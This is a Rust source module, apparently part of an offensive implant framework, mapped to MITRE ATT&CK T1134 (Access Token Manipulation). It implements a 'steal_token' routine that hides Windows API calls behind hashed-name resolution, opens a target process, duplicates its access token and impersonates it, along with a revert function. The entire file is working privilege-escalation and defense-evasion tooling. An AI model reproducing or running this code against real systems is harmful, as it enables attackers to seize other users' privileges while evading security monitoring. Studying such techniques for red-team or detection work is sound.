//! Tactic: Privilege Escalation (TA0004) / Defense Evasion (TA0005)
//! Technique: T1134 (Access Token Manipulation)

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::{HANDLE, PVOID};
#[cfg(target_os = "windows")]
use core::ffi::c_void;
use crate::utils::sensitive::SensitiveData;
#[cfg(target_os = "windows")]
use alloc::vec::Vec;
#[cfg(target_os = "windows")]
use zeroize::Zeroize;

pub struct Token;

impl Token {
    #[cfg(target_os = "windows")]
    pub fn steal_token(&self, pid: u32) -> SensitiveData {
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let advapi32 = hash_str(b"advapi32.dll");

            let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
            let open_process_token = resolve_function(advapi32, hash_str(b"OpenProcessToken"));
            let duplicate_token_ex = resolve_function(advapi32, hash_str(b"DuplicateTokenEx"));
            let impersonate_user = resolve_function(advapi32, hash_str(b"ImpersonateLoggedOnUser"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));

            if open_process.is_null() || open_process_token.is_null() || duplicate_token_ex.is_null() {
                return SensitiveData::new(b"Failed to resolve APIs");
            }

            type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            type FnOpenProcessToken = unsafe extern "system" fn(HANDLE, u32, *mut HANDLE) -> i32;
            type FnDuplicateTokenEx = unsafe extern "system" fn(HANDLE, u32, PVOID, i32, i32, *mut HANDLE) -> i32;
            type FnImpersonateLoggedOnUser = unsafe extern "system" fn(HANDLE) -> i32;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            // PROCESS_QUERY_INFORMATION = 0x0400
            let h_proc = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x0400, 0, pid);
            if h_proc.is_null() {
                return SensitiveData::new(b"Failed to open process");
            }

            let mut h_token: HANDLE = core::ptr::null_mut();
            // TOKEN_DUPLICATE | TOKEN_QUERY = 0x0002 | 0x0008 = 0x000A
            if core::mem::transmute::<_, FnOpenProcessToken>(open_process_token)(h_proc, 0x000A, &mut h_token) == 0 {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_proc);
                return SensitiveData::new(b"Failed to open token");
            }

            let mut h_dup: HANDLE = core::ptr::null_mut();
            // MAXIMUM_ALLOWED = 0x02000000
            // SecurityImpersonation = 2
            // TokenPrimary = 1 (or TokenImpersonation = 2)
            // We want to impersonate, so TokenImpersonation is fine, or Primary for CreateProcessWithToken
            // Let's use TokenImpersonation (2) for ImpersonateLoggedOnUser
            if core::mem::transmute::<_, FnDuplicateTokenEx>(duplicate_token_ex)(
                h_token, 
                0x02000000, 
                core::ptr::null_mut(), 
                2, // SecurityImpersonation
                2, // TokenImpersonation
                &mut h_dup
            ) == 0 {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_token);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_proc);
                return SensitiveData::new(b"Failed to duplicate token");
            }

            if core::mem::transmute::<_, FnImpersonateLoggedOnUser>(impersonate_user)(h_dup) == 0 {
                let res = b"Failed to impersonate";
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_dup);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_token);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_proc);
                return SensitiveData::new(res);
            }

            // Cleanup handles (impersonation sticks to thread)
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_dup);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_token);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_proc);

            SensitiveData::new(b"Token impersonated successfully")
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn steal_token(&self, _pid: u32) -> SensitiveData {
        SensitiveData::new(b"Not supported on Linux")
    }

    #[cfg(target_os = "windows")]
    pub fn revert_to_self(&self) -> SensitiveData {
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let revert = resolve_function(advapi32, hash_str(b"RevertToSelf"));
            if !revert.is_null() {
                type FnRevertToSelf = unsafe extern "system" fn() -> i32;
                if core::mem::transmute::<_, FnRevertToSelf>(revert)() != 0 {
                    return SensitiveData::new(b"Reverted to self");
                }
            }
            SensitiveData::new(b"Failed to revert")
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn revert_to_self(&self) -> SensitiveData {
        SensitiveData::new(b"Not supported on Linux")
    }
}
